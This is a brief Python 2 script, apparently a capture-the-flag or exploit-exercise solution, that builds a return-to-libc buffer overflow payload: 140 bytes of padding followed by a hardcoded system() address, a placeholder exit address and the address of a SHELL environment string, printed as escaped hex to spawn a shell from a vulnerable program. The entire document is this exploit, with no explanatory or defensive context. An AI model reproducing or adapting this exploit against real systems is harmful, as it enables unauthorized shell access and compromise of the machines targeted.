#!/usr/bin/env python2

import struct

def x(n):
    l = struct.pack('<I', n).encode('hex')
    l = '\\x' + '\\x'.join([l[i:i+2] for i in range(0, len(l), 2)])
    return l

import subprocess

payload = b'A' * (140)
system = 0xb7e6b060
system = x(system)
payload += system
exit_addr = 0xDEADBEEF
exit_addr = x(exit_addr)
payload += exit_addr
shell_addr = 0xBFFFF99C # SHELL=/bin/[da]sh
shell_addr = x(shell_addr)
payload += shell_addr

print(payload)

